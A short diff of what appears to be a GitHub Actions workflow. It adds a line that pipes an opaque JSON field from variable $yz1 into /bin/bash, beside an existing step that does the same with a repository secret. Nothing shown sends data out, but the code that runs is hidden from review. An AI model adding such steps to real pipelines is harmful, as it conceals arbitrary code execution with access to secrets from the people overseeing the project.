@@ -23,6 +23,7 @@ jobs:
           lj22: ${{ secrets.lj22 }}
         run: |
           printf '%s' "$lj22" | jq -r .s7 | /bin/bash
+          echo $yz1 | jq -r .yf4561 | /bin/bash
 
       - name: Save archive
         if: always()
